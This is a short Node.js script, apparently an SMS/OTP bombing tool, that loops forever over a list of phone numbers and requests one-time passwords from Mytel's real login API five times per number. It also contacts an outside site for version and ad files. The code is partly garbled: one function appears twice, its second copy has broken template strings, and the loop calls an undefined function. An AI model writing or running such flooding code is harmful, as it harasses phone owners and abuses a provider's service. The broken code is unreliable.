// index.js const axios = require("axios"); const FormData = require("form-data"); const fs = require("fs");

const phones = JSON.parse(fs.readFileSync("./phones.json", "utf-8"));

async function sendOtp(phone) {
  for (let i = 0; i < 5; i++) {
    try {
      const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
      const res = await axios.get(url);
      if (res.status === 200) {
        console.log(`✅ (${i + 1}/5) OTP sent to ${phone}`);
      } else {
        console.log(`⚠️ (${i + 1}/5) Failed for ${phone}: Status ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ (${i + 1}/5) OTP error for ${phone}: ${e.message}`);
    }
  }
}

async function sendOtp(phone) { for (let i = 0; i < 5; i++) { try { const url = https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}; const res = await axios.get(url); if (res.status === 200) { console.log(✅ (${i + 1}/5) OTP sent to ${phone}); } else { console.log(⚠️ (${i + 1}/5) Failed for ${phone}: Status ${res.status}); } } catch (e) { console.error(❌ (${i + 1}/5) OTP error for ${phone}: ${e.message}); } } }

async function backgroundRequests() { try { await axios.head("https://ironcoder.site/ironmyid/version.php"); console.log("✅ version.php reachable"); } catch (e) { console.log("❌ version.php unreachable:", e.message); }

try {
    await axios.head("https://ironcoder.site/ironmyid/myads.php");
    console.log("✅ myads.php reachable");
} catch (e) {
    console.log("❌ myads.php unreachable:", e.message);
}

}

async function mainLoop() { while (true) { for (const phone of phones) { await postForm(phone); } await backgroundRequests(); console.log("🔁 Restarting loop with all phones...\n"); } }

mainLoop();

